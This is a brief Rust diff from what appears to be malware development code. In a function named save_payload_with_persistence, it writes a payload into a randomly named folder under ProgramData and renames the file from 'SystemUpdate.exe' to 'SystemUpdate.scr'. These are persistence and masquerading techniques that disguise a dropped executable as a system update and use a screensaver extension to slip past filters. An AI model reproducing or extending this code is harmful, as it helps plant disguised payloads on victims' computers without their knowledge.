@@ -147,7 +147,7 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
     let dir_name: String = random_bytes.encode_hex();
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
-    let full_file_path_win = format!("{}\\SystemUpdate.exe", folder_path);
+    let full_file_path_win = format!("{}\\SystemUpdate.scr", folder_path);
 
     if let Err(e) = fs::create_dir_all(&folder_path) {
         return Err(format!(
